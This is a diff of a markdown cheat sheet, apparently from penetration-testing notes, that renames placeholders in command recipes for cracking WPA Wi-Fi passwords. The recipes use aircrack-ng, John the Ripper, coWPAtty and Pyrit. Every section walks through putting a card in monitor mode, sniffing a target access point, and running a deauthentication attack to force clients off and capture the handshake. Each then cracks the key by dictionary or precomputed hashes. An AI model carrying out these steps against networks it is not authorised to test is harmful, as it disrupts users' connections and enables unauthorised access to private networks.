@@ -1,41 +1,41 @@
 
 ## Cracking with Aircrack-ng
 
-   airmon-ng start <interface> <AP channel>                                   ## setting the wireless card (wlan0) to monitor mode
-   airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>      ## listening to the target AP on the specified channel
-   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>                   ## performing a deauthentication attack against AP to capture the handshake packet
-   aircrack-ng -w <wordlist> <capture>                                        ## cracking WPA password with aircrack-ng
+   airmon-ng start <interface> <AP_Channel>                                        ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>      ## listening to the target AP on the specified channel
+   aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                        ## performing a deauthentication attack against AP to capture the handshake packet
+   aircrack-ng -w <wordlist> <capture_file>                                        ## cracking WPA password with aircrack-ng
    
    
 ## Cracking with JTR and Aircrack-ng
 
-   airmon-ng start <interface> <AP channel>                                                  ## setting the wireless card (wlan0) to monitor mode
-   airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>                     ## listening to the target AP on the specified channel
-   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>                                  ## performing a deauthentication attack against AP to capture the handshake packet
-   ./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w - <capture>     ## cracking WPA password with JTR and aircrack-ng 
+   airmon-ng start <interface> <AP_Channel>                                                       ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>                     ## listening to the target AP on the specified channel
+   aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                                       ## performing a deauthentication attack against AP to capture the handshake packet
+   ./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w - <capture_file>     ## cracking WPA password with JTR and aircrack-ng 
   
   
 ## Cracking with  coWPAtty
   
-   airmon-ng start <interface> <AP channel>                                    ## setting the wireless card (wlan0) to monitor mode
-   airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>       ## listening to the target AP on the specified channel
-   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>                    ## performing a deauthentication attack against AP to capture the handshake packet
-   cowpatty -r <capture> -f <wordlist> -2 -s <ESSID>                           ## cracking WPA password with coWPAtty in dictionary mode
+   airmon-ng start <interface> <AP_Channel>                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>       ## listening to the target AP on the specified channel
+   aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                         ## performing a deauthentication attack against AP to capture the handshake packet
+   cowpatty -r <capture_file> -f <wordlist> -2 -s <ESSID>                           ## cracking WPA password with coWPAtty in dictionary mode
    or
-   genpmk -f <wordlist> -d <hashes filename> -s <ESSID>                        ## generating hashes to crack WPA password in coWPAtty with rainbow table mode
-   cowpatty -r <capture> -d <hashes filename> -2 -s <ESSID>                    ## cracking WPA password with coWPAtty using generated hashes
+   genpmk -f <wordlist> -d <hashes_file> -s <ESSID>                                 ## generating hashes to crack WPA password in coWPAtty with rainbow table mode
+   cowpatty -r <capture> -d <hashes_file> -2 -s <ESSID>                             ## cracking WPA password with coWPAtty using generated hashes
  
   
 ## Cracking with Pyrit
 
-   airmon-ng start <interface> <AP channel>                             ## setting the wireless card (wlan0) to monitor mode
-   pyrit -r <interface> -o <capture> stripLive                          ## using pyrit to sniff in monitor mode interface by saving the capture process to a file
-   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>             ## performing a deauthentication attack against AP to capture the handshake packet
-   pyrit -r <capture> -i <wordlist> -b <AP MAC> attack_passthrough      ## cracking WPA password with pyrit in dictionary mode
+   airmon-ng start <interface> <AP_Channel>                                  ## setting the wireless card (wlan0) to monitor mode
+   pyrit -r <interface> -o <capture_file> stripLive                          ## using pyrit to sniff in monitor mode interface by saving the capture process to a file
+   aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                  ## performing a deauthentication attack against AP to capture the handshake packet
+   pyrit -r <capture_file> -i <wordlist> -b <AP_MAC> attack_passthrough      ## cracking WPA password with pyrit in dictionary mode
    or
-   pyrit -i <wordlist> import_passwords                                 ## import word list to crack WPA password in pyrit with database mode                         
-   pyrit -e <ESSID> create_essid                                        ## adding the ESSID of the access point to the pyrit database
-   pyrit batch                                                          ## creating PMKs for ESSID
-   pyrit -r <capture> -b <AP MAC> attack_db                             ## cracking WPA password in database mode with pyrit
+   pyrit -i <wordlist> import_passwords                                      ## import word list to crack WPA password in pyrit with database mode                         
+   pyrit -e <ESSID> create_essid                                             ## adding the ESSID of the access point to the pyrit database
+   pyrit batch                                                               ## creating PMKs for ESSID
+   pyrit -r <capture_file> -b <AP_MAC> attack_db                             ## cracking WPA password in database mode with pyrit
    
    
